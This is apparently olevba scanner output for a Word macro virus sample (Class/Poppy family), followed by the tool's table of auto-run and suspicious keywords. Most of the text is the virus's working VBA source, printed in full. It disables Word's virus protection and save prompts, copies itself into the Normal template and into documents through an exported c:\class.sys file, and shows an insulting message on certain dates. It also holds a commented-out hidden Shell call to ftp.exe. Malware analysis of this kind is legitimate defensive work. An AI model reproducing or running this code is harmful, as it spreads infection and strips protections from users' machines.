olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-99922dabecffee1ba15fc6c5e4924800242ada0f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-99922dabecffee1ba15fc6c5e4924800242ada0f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
On Error GoTo out
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
Options.VirusProtection = False
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
Options.SaveNormalPrompt = False
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
Options.ConfirmConversions = False
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
If nt > 70 And ad > 0 Then GoTo out
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
If nt < 70 Then
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
End If
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
host.codemodule.AddFromFile ("c:\class.sys")
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
With host.codemodule
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
    For x = 1 To 4
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
    .deletelines 1
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
    Next x
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
End With
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
If nt < 70 Then
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
    With host.codemodule
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
    .replaceline 1, "Sub AutoClose()"
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
    .replaceline 71, "Sub ToolsMacro()"
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
    End With
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
End If
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
With host.codemodule
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
    For x = 2 To 72 Step 2
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
    Next x
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
End With
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
out:
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
End Sub
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
Sub ToolsMacro()
'CHINMAYA3/6/2000 2:50:41 PMHP DeskJet 670C Series Printer on \\LAB13\HPVKS
End Sub


Private Sub Document_Open()
On Error Resume Next

'DECLARATIONS

Dim sViralCode As String, nFreeFile As Integer
Dim oNormal As Object, oDocument As Object, sFileName As String
Dim rRange As Range

Const cIndicator = "INDIA"  ' CONSTANT TO FIND IF THE FILE IS ALREADY INFECTED OR NOT

    Options.VirusProtection = False 'SET VIRUS PROTECTION TO OFF MODE
    nFreeFile = FreeFile

    Randomize
    sFileName = "\India" + Str(32767 * Rnd) + ".txt"
    
    Open CurDir + sFileName For Output As #nFreeFile
        Write #nFreeFile, "Kashmir is an integral part of INDIA. JAI HIND"
    Close #nFreeFile
    
    Set oDocument = ActiveDocument.VBProject.VBComponents.Item(1)
    Set oNormal = NormalTemplate.VBProject.VBComponents.Item(1)
    
    If (oNormal.codemodule.Find(cIndicator, 1, 1, 999, 999)) = False Then
        sViralCode = oDocument.codemodule.Lines(1, oDocument.codemodule.CountOfLines)
        ViralCode = ViralCode & Chr(10)
        oNormal.codemodule.deletelines 1, oNormal.codemodule.CountOfLines
        oNormal.codemodule.AddFromString sViralCode
        
    End If

'    Shell "Command.com /c ftp.exe -n -s:" + CurDir + sFileName, vbHide
    
    If (oDocument.codemodule.Find(cIndicator, 1, 1, 999, 999)) = False Then
        sViralCode = oNormal.codemodule.Lines(1, oNormal.codemodule.CountOfLines)
        ViralCode = ViralCode & Chr(10)
        oDocument.codemodule.deletelines 1, oNormal.codemodule.CountOfLines
        oDocument.codemodule.AddFromString sViralCode
    End If
    
    ActiveDocument.Save
    NormalTemplate.Save
   
End Sub


' Virus Created By An Indian Citizen



Sub AutoOpen()
'cirs12/22/99 12:31:44 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
On Error GoTo out
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
Options.VirusProtection = False
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
Options.SaveNormalPrompt = False
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
Options.ConfirmConversions = False
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
If nt > 70 And ad > 0 Then GoTo out
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
If nt < 70 Then
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
End If
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
host.codemodule.AddFromFile ("c:\class.sys")
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
With host.codemodule
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
    For x = 1 To 4
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
    .deletelines 1
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
    Next x
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
End With
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
If nt < 70 Then
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
    With host.codemodule
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
    .replaceline 1, "Sub AutoClose()"
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
    .replaceline 71, "Sub ToolsMacro()"
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
    End With
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
End If
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
With host.codemodule
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
    For x = 2 To 72 Step 2
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
    Next x
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
End With
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
out:
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
End Sub
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
Sub ViewVBCode()
'cirs12/22/99 12:31:45 PMHP DeskJet 670C Series Printer on \\LAB13\HPInteresting Info
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

